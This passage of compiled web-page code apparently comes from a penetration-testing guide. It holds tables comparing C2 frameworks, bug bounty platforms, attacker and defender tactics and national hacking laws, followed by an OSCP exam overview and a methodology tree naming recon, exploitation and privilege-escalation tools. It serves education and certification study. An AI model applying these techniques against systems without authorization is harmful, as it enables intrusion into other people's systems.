          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Ease of Use"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "AV Evasion"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (with profile)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (built-in)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Community"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Large (cracked)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Growing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Growing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Declining"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Small"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Growing"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Active Development"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (BC-Security fork)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (Ryan Cobb)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "65-bug-bounty-platforms-comparison",
      children: "6.5 Bug Bounty Platforms Comparison"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Platform"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Founded"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Payout Range"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Fee Model"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Program Access"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Key Differentiator"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "HackerOne"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2012"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "100"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "100 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7278em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "100"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "250K+"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "20% bounty fee"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Public + Invite"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Largest program count"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Bugcrowd"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2011"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "50"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "50 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7278em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "50"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "100K+"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "15-20%"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Public + Private"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Managed bug bounty"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Intigriti"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2016"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "50"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "50 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7278em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "50"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "50K+"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "15%"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Public + Private"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "EU-focused, API-friendly"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Synack"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2013"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "100"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "100 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7278em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "100"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "25K+"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Subscription"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Invite-only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "US Federal programs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "YesWeHack"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2015"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "50"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "50 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7278em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "50"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "50K+"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "15%"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Public + Private"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Strong in EU/APAC"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "HackenProof"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2017"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "100"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "100 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7278em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "100"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "50K+"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "20%"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Public + Private"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Crypto/blockchain focused"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "BugBase"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2020"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "50"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "50 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7278em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "50"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "25K+"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0% (platform fee only)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Public"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Indian market focus"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "66-attack-vs-defense-mindset",
      children: "6.6 Attack vs Defense Mindset"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Phase"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Attacker (Offensive)"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Defender (Defensive)"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Recon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Find as much info as possible"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Reduce public attack surface. Monitor OSINT leaks"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Weaponoization"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Create custom payloads, FUD"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Deploy EDR, AMSI, WDAC, AppLocker"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Delivery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Phishing, exploit USB, waterhole"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Email security, DMARC, link sandboxing"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Exploitation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Find unpatched vulns, zero-days"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Patch management, vulnerability scanning"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Installation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Establish persistence, backdoor"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Endpoint monitoring, file integrity checking"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "C2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Obfuscate traffic, domain fronting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network detection, DNS analysis, proxy inspection"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Lateral Movement"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pass-the-hash, PSExec, WinRM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network segmentation, tiered admin model"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Objective Execution"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Exfiltrate, encrypt, destroy"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DLP, backup, DR plan, incident response"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Credential Access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "LSASS dumping, keylog, Kerberoast"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "LSA protection, Credential Guard, MFA"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Evasion"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Process injection, API unhooking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Behavioral detection, EDR telemetry"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "67-legal-frameworks-by-country",
      children: "6.7 Legal Frameworks by Country"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Country"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Primary Law"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Key Provisions"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Researcher Risk"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "USA"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CFAA (18 U.S.C. § 1030)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unauthorized access, damage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium (Van Buren narrowed scope)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "UK"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Computer Misuse Act 1990"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "§1-3: Access, intent, damage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (no research exemption)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Germany"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "§202a StGB (Data Espionage)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unauthorized data access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (criminalizes scanning)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "France"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Article 323-1 CP"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unauthorized system access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Canada"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Criminal Code §342.1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unauthorized computer use"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Australia"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Criminal Code Act 1995 §477"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unauthorized access, modification"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "India"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IT Act 2000 §43, 66"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unauthorized access, data theft"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (broad interpretation)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Japan"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unauthorized Computer Access Law"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Prohibited access, tool provision"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Russia"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Federal Law 149-FZ, CC §272"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unauthorized access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Very High (dual-use tools)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "China"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cybersecurity Law, Criminal Law §285"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Illegal computer intrusion"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Very High"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "EU"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GDPR, ePrivacy Directive"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data breach notification"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low-Medium"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-7-oscp-methodology-guide",
      children: "Section 7: OSCP Methodology Guide"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "71-oscp-exam-overview",
      children: "7.1 OSCP Exam Overview"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "The Offensive Security Certified Professional (OSCP) is the most respected hands-on pentesting certification. The current exam format:"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Aspect"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Details"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Exam Duration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "23 hours 45 minutes (24 hours - 15 min buffer)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Machines"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "3 standalone + 1 AD set (3 machines) = 6 total"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Points"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "100 total (must score 70+ to pass)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Standalone machines"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "20-30 points each"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "AD Set"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "40 points"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Lab Report"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "10 bonus points (if completed)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Retakes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1 free retake included"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "72-oscp-methodology",
      children: "7.2 OSCP Methodology"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "RECON PHASE (1-2 hours per machine):\n├── Nmap: -sC -sV -p- -T4 -oA nmap/<target>\n├── Web: gobuster, nikto, nuclei\n├── SMB: enum4linux, smbclient, crackmapexec\n└── Known vulns: searchsploit \"service version\"\n\nENUMERATION PHASE (2-3 hours):\n├── Deep port-by-port enumeration\n├── Check every web directory, parameter, form\n├── Inspect source code, comments, hidden fields\n├── Test default credentials\n└── Check version-specific exploits\n\nEXPLOITATION PHASE (1-4 hours):\n├── Low-hanging fruit first (default creds, known exploits)\n├── If no easy exploit:\n│   ├── Web: SQLmap, XSS, LFI/RFI, file upload\n│   ├── Service: buffer overflow, command injection\n│   └── Password: hydra, john, crackmapexec\n└── If stuck: re-enumerate, try different services\n\nPRIVESC PHASE (1-3 hours):\n├── Linux:\n│   ├── linpeas.sh, linux-exploit-suggester.sh\n│   ├── SUID, cron, sudo -l, PATH hijacking\n│   └── Kernel exploits (DirtyPipe, PwnKit)\n├── Windows:\n│   ├── winpeas.exe, PowerUp.ps1, Sherlock.ps1\n│   ├── Unquoted paths, service permissions\n│   └── Token impersonation, kernel exploits\n└── AD Set:\n    ├── BloodHound, crackmapexec\n    ├── AS-REP roasting, Kerberoasting\n    └── ACL abuse, DCSync\n\nDOCUMENTATION PHASE (during entire exam):\n├── Screenshot every command and output\n├── Note: IP, ports, services, version strings\n├── Note: exact commands used for enumeration\n├── Note: exploit source and modification\n├── Screenshot: proof.txt on each machine\n└── Write report on the 24-hour break day\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "73-oscp-exam-tips",
      children: "7.3 OSCP Exam Tips"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
